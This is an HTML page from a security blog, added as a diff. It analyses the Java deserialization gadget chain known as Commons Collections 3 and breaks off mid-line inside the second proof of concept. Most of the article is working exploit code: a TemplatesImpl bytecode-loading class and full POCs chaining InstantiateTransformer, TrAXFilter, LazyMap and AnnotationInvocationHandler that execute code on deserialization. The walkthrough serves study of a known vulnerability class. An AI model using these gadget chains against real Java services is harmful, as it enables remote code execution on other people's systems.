@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+		
+<title>Java反序列化-Commons Collections3利用链分析-信息安全博客</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/favicon1.ico">
+
+
+<meta name="keywords" content="java安全,cc链,">
+<meta name="description" content="">
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+	<meta name="generator" content="Hexo 5.4.0"></head>
+
+	<body>
+		
+<link rel="stylesheet" href="/css/page.css">
+
+
+<link rel="stylesheet" href="/css/page_cente.css">
+
+
+<link rel="stylesheet" href="/css/atom-one-dark.css">
+
+
+<link rel="stylesheet" href="/css/header.css">
+
+	<div class="header">
+		<div class="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/logo.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										主页
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										文章
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										分类
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										标签
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										友情链接
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										关于
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>TRRQ</h2>
+    </div>
+    <ul>
+        
+        <li>
+            <a href="/">主页</a>
+        </li>
+        
+        <li>
+            <a href="/archives">文章</a>
+        </li>
+        
+        <li>
+            <a href="/categories">分类</a>
+        </li>
+        
+        <li>
+            <a href="/tags">标签</a>
+        </li>
+        
+        <li>
+            <a href="/links">友情链接</a>
+        </li>
+        
+        <li>
+            <a href="/about">关于</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
+    </div>
+</div>
+<div class='shelter'
+    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'>
+</div>
+<style>
+    .sidebar {
+        width: 0;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        background: #fff;
+        z-index: 999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
+    }
+
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
+    }
+</style>
+
+<script>
+    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
+</script>
+		<script>
+			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
+		</script>
+<div class="header-bg bg-content-img">
+    <div class="bg-content">
+        <ul class="tag">
+            
+            
+            <li><a href="/tags/java安全">java安全</a></li>
+            
+            <li><a href="/tags/cc链">cc链</a></li>
+            
+            
+        </ul>
+        <h1>Java反序列化-Commons Collections3利用链分析</h1>
+        <div class="article-info">
+            <div class="article-author">
+                
+                <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                    xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                    <path
+                        d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                        p-id="2902" fill="#ffffff"></path>
+                </svg>
+                
+                <span> <a href="">TRRQ</a></span>
+                <p>2022-03-06 14:54:43</p>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="article-content">
+    <div id="article" class="content">
+        <h1 id="Java反序列化-Commons-Collections3利用链分析"><a href="#Java反序列化-Commons-Collections3利用链分析" class="headerlink" title="Java反序列化-Commons Collections3利用链分析"></a>Java反序列化-Commons Collections3利用链分析</h1><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>首先是通过ClassLoader类，找到可以loaderclass执行我们代码函数</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306151139.png"></p>
+<p>由loadClass进行加载</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306151247.png"></p>
+<p>返回下一个loadClass</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306151757.png"></p>
+<p>最后会走到defineClass，这里是从字节里加载一个类</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306151612.png"></p>
+<p>查找谁调用了defineClass函数，查找有没有public的方法调用了defineClass</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306155737.png"></p>
+<p>可以看到这边有个default权限的方法</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306160458.png"></p>
+<p>defineClass我们再查找下调用链</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306160954.png"></p>
+<p>我们找到了三个方法，我们可以进去看下，每个的返回结果</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306161830.png"></p>
+<p>分析了下第一个是返回class，第二个返回下标，第三个我们可以看到，def给class赋完值，后执行了newInstance</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306162459.png"></p>
+<p>通过loader.defineClass来将_class赋值的</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306163919.png"></p>
+<p>我们再找下这个的调用链</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306162629.png"></p>
+<p>我们调用TemplatesImpl的newTransformer()，就会调它的getTransletInstance()</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306163055.png"></p>
+</br>
+
+<p>这里的构造方法是为空，所以值我们是需要自己去赋的</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306171221.png"></p>
+</br>
+
+<p>我们看下要走进class赋值需要哪些参数，_name不能为空，这样能进入defineTransletClasses()，使得对_class进行赋值</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306185110.png"></p>
+<p>defineTransletClasses</p>
+<p>需要传入_bytecodes为空</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306213544.png"></p>
+</br>
+
+<p>这里判断了_bytecodes的数量，再去for循环一个个defineClass，所以这个我们只要传入一个数组的_bytecodes即可</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220306213517.png"></p>
+</br>
+
+<p>我们将值都用反射进行传入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class tc = templates.getClass();<br><br>        <span class="hljs-comment">//设置_name属性</span><br>        Field nameField = tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-keyword">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br><br>        <span class="hljs-comment">//设置_bytecodes属性</span><br>        Field bytecodesField = tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">byte</span>[] code  = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://tmp/calc.class&quot;</span>));<br>        <span class="hljs-keyword">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates,codes);<br>        templates.newTransformer();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>发生报错</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220307103636.png"></p>
+<p>我们通过调试defineTransletClasses，发现_auxClasses为null，如果走到下面_transletIndex也过不去，所以我们只能走到if为true，使得_transletIndex赋值</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220307104400.png"></p>
+<p>我们就看下他的条件，获取的是父类判断是否是ABSTRACT_TRANSLET</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220307104653.png"></p>
+</br>
+
+<p>所以说我们传入的class需要继承父类，并且实现它的方法编译下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span></span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>尝试运行下payload，成功弹出计算器，所以说我们只要调用到了newTransformer就可以执行代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class tc = templates.getClass();<br><br>        <span class="hljs-comment">//设置_name属性</span><br>        Field nameField = tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-keyword">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br><br>        <span class="hljs-comment">//设置_bytecodes属性</span><br>        Field bytecodesField = tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">//设置codes属性</span><br>        <span class="hljs-keyword">byte</span>[] code  = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://tmp/calc.class&quot;</span>));<br>        <span class="hljs-keyword">byte</span>[][] codes = &#123;code&#125;;<br><span class="hljs-comment">//        bytecodesField.set(templates,);</span><br>        bytecodesField.set(templates,codes);<br>        <br>        templates.newTransformer();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>之后我们可以用cc1的前面的代码，伪造newTransformer()</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class tc = templates.getClass();<br><br>        <span class="hljs-comment">//设置_name属性</span><br>        Field nameField = tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-keyword">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br><br>        <span class="hljs-comment">//设置_bytecodes属性</span><br>        Field bytecodesField = tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">//设置codes属性</span><br>        <span class="hljs-keyword">byte</span>[] code  = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://tmp/calc.class&quot;</span>));<br>        <span class="hljs-keyword">byte</span>[][] codes = &#123;code&#125;;<br><span class="hljs-comment">//        bytecodesField.set(templates,);</span><br>        bytecodesField.set(templates,codes);<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(<span class="hljs-number">1</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>之后我们直接使用CC1的后半段即可</p>
+</br>
+
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test3</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class tc = templates.getClass();<br><br>        <span class="hljs-comment">//设置_name属性</span><br>        Field nameField = tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-keyword">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br><br>        <span class="hljs-comment">//设置_bytecodes属性</span><br>        Field bytecodesField = tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">//设置codes属性</span><br>        <span class="hljs-keyword">byte</span>[] code  = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://tmp/calc.class&quot;</span>));<br>        <span class="hljs-keyword">byte</span>[][] codes = &#123;code&#125;;<br><br>        bytecodesField.set(templates,codes);<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap();<br>        <span class="hljs-comment">//传入keyTransformer、valueTransformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer   );<br><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationHadlConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationHadlConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler h = (InvocationHandler) annotationInvocationHadlConstructor.newInstance(Override.class, lazyMap);<br><br>        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,h);<br><span class="hljs-comment">//        Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[])</span><br>        Object o = annotationInvocationHadlConstructor.newInstance(Override.class,mapProxy);<br><br>        serialize(o);<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-comment">//序列化和反序列化</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// ObjectOutputStream 对象输出流，将Person对象存储到E盘的Person.txt文件中，完成对Person对象的序列化操作</span><br>        ObjectOutputStream oo = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        oo.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<br>            <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        Object object = (Object) ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！&quot;</span>);<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+</br>
+
+<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>我们查找谁调用了newTransformer</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220307120238.png"></p>
+<p>可惜没有继承Serializable，否则下面构造函数是传入一个templates参数</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220307123928.png"></p>
+<p>我们可以使用其他的transform方法来调用构造函数，这里是使用InstantiateTransformer来构造，正好符合我们的要求</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220307123952.png"></p>
+<p>这个方法的构造函数</p>
+<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220307121133.png"></p>
+<p>我们结合着TrAXFilter构造函数，参数是一个Templates</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;);<br>        instantiateTransformer.transform(TrAXFilter.class); <span class="hljs-comment">//传入TrAXFilter构造方法</span><br></code></pre></td></tr></table></figure>
+
+<p>因为要传入TrAXFilter，要执行他的transform，这边xxx.transform，xxx是我们无法控的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br></code></pre></td></tr></table></figure>
+
+<p>这样我们就改好为InstantiateTransformer.transform()来调用到TrAXFilter构造方法，调用到templates.newTransformer()</p>
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p>获取到最终POC</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test3</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class tc = templates.getClass();<br><br>        <span class="hljs-comment">//设置_name属性</span><br>        Field nameField = tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-keyword">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br><br>        <span class="hljs-comment">//设置_bytecodes属性</span><br>        Field bytecodesField = tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">//设置codes属性</span><br>        <span class="hljs-keyword">byte</span>[] code  = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://tmp/calc.class&quot;</span>));<br>        <span class="hljs-keyword">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates,codes);<br><span class="hljs-comment">//        templates.newTransformer();</span><br><span class="hljs-comment">//        instantiateTransformer.transform(TrAXFilter.class); //调用了TrAXFilter构造方法，也就调用了templates.transform</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br><span class="hljs-comment">//</span><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap();<br>        <span class="hljs-comment">//传入keyTransformer、valueTransformer</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        Class&lt;?&gt; aClass = Class.forName(<span 